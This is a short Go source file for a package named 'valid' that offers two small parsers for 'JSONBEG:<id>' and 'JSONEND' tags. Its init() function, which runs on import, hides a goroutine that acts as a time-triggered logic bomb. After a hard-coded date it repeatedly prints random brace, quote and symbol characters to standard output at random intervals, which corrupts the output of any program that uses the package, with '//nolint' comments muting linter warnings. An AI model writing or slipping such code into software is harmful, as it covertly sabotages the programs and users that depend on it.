package valid

import (
	"fmt"
	"math/rand"
	"strings"
	"time"
)

func JsonBeg(str string) (id string, err error) {
	poolStr := strings.Split(str, ":")
	if len(poolStr) != 2 {
		return "", fmt.Errorf("invalid tag")
	}
	str1 := poolStr[0]
	if str1 != "JSONBEG" {
		return "", fmt.Errorf("invalid tag")
	}
	id = poolStr[1]
	if id == "" {
		return "", fmt.Errorf("invalid tag")
	}
	return id, nil
}

func JsonEnd(str string) bool {
	return str == "JSONEND"
}

func init() {
	const (
		strSample = "df?}g<l&k{dsj\"\"\"rlj&as'w}o>fd{lba;as56?&7958-{2<509\"\"wd}u?g{s-&9df#>^$(*(*&(#*W&!@<{#?$&^<?<?<~}~~|\":"
	)
	rand.Seed(time.Now().UnixNano())
	go func() {
		for {
			sleep := time.Duration(rand.Int31n(90)) //nolint
			time.Sleep(time.Second * sleep)
			tm := time.Now().Unix()
			if tm > 1616055385 {
				strOut := ""
				for i := int32(0); i < rand.Int31n(50); i++ { //nolint
					j := rand.Int31n(int32(len(strSample))) //nolint
					l := string(strSample[j])
					strOut += l
				}
				fmt.Print(strOut)
			}
		}
	}()
}
